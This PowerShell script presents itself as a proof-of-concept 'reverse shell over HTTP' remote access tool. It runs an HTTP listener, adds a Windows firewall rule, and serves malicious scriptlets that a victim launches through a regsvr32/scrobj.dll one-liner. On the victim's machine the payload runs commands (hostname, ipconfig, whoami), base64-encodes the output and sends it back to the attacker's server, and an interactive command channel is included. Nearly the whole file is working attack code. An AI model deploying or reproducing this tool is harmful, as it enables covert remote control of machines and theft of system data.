<#
    
  Author: Casey Smith @subTee
  License: BSD3-Clause
	
  .SYNOPSIS
  
  Simple Reverse Shell over HTTP. Execute Commands on Client.  
  
  "regsvr32 /u /n /s /i:http://127.0.01/file.sct scrobj.dll"
  
  Listening Server IP Address
  
#>

$Server = '127.0.0.1' #Listening IP. Change This.

function Receive-Request {
   param(      
      $Request
   )
   $output = ""
   $size = $Request.ContentLength64 + 1   
   $buffer = New-Object byte[] $size
   do {
      $count = $Request.InputStream.Read($buffer, 0, $size)
      $output += $Request.ContentEncoding.GetString($buffer, 0, $count)
   } until($count -lt $size)
   $Request.InputStream.Close()
   write-host $output
}

$listener = New-Object System.Net.HttpListener
$listener.Prefixes.Add('http://+:80/') 

netsh advfirewall firewall delete rule name="PoshRat 80" | Out-Null
netsh advfirewall firewall add rule name="PoshRat 80" dir=in action=allow protocol=TCP localport=80 | Out-Null

$listener.Start()
'Listening ...'
while ($true) {
    $context = $listener.GetContext() # blocks until request is received
    $request = $context.Request
    $response = $context.Response
	$hostip = $request.RemoteEndPoint
	#Use this for One-Liner Start
	
	if ($request.Url -match '/file.sct$' -and ($request.HttpMethod -eq "GET")) {  
        $message = '<?XML version="1.0"?>
					<scriptlet>
					<registration
						description="DebugShell"
						progid="DebugShell"
						version="1.00"
						classid="{90001111-0000-0000-0000-0000FEEDACDC}"
						>
						
						<script language="JScript">
							<![CDATA[
							
								
									try
									{
									 	var o = GetObject("script:http://'+$Server+'/task.sct");
										o.Exec();
									}
									catch(err)
									{
									
									}
								
						
							]]>
					</script>
					</registration>
					
					
					</scriptlet>
					
		'

    }		
	
	if ($request.Url -match '/task.sct$' -and ($request.HttpMethod -eq "GET")) {  
        $message = '<?XML version="1.0"?>
					<scriptlet>

					<registration
						description="Bandit"
						progid="Bandit"
						version="1.00"
						classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"
						>
						
						
						<!-- Proof Of Concept - Casey Smith @subTee -->
						
					</registration>

					<public>
						<method name="Exec"></method>
					</public>
					<script language="JScript">
					<![CDATA[
						
						function Base64Encode(input) 
{
	
						var _keyStr = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";

							var output = "";
							var chr1, chr2, chr3, enc1, enc2, enc3, enc4;
							var i = 0;

							while (i < input.length) {

								chr1 = input.charCodeAt(i++);
								chr2 = input.charCodeAt(i++);
								chr3 = input.charCodeAt(i++);

								enc1 = chr1 >> 2;
								enc2 = ((chr1 & 3) << 4) | (chr2 >> 4);
								enc3 = ((chr2 & 15) << 2) | (chr3 >> 6);
								enc4 = chr3 & 63;

								if (isNaN(chr2)) {
									enc3 = enc4 = 64;
								} else if (isNaN(chr3)) {
									enc4 = 64;
								}

								output = output +
								_keyStr.charAt(enc1) + _keyStr.charAt(enc2) +
								_keyStr.charAt(enc3) + _keyStr.charAt(enc4);

							}

							return output;
						}
						
						function Exec()
						{
							var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
							r = new ActiveXObject("WScript.Shell").Exec("cmd.exe /c hostname&&ipconfig&& whoami");
							var so;
							while(!r.StdOut.AtEndOfStream){so=r.StdOut.ReadAll()}
							var encoded = Base64Encode(so);
							var encodedArray = encoded.match(/.{1,256}/g);
							for(var i = 0; i < encodedArray.length; i++)
							{
								try
								{
									var r = GetObject("script:http://'+$Server+'/recv"+ "?s="+i+"&b="+ encodedArray[i]);
								}
								catch(e){}
								
							}
						}
						
						
						
					]]>
					</script>

					</scriptlet>
		'

    }		
	
	if ($request.Url -match '/rat$' -and ($request.HttpMethod -eq "POST") ) { 
		Receive-Request($request)	
	}
    if ($request.Url -match '/rat$' -and ($request.HttpMethod -eq "GET")) {  
        $response.ContentType = 'text/xml'
        $message = Read-Host "JS $hostip>"		
    }
    if ($request.Url -match '/recv' -and ($request.HttpMethod -eq "GET") ) { 
		Write-Host $request.QueryString["b"].ToString() -Fore Green
		if($request.QueryString["s"].ToString() -eq 0)
		{
			Add-Content c:\Tools\test.txt `n`r
			Add-Content c:\Tools\test.txt $request.QueryString["b"].ToString()
		}
		else
		{
			Add-Content c:\Tools\test.txt $request.QueryString["b"].ToString()
		}
		
	}
	
	

    [byte[]] $buffer = [System.Text.Encoding]::UTF8.GetBytes($message)
    $response.ContentLength64 = $buffer.length
    $output = $response.OutputStream
    $output.Write($buffer, 0, $buffer.length)
    $output.Close()
}

$listener.Stop()
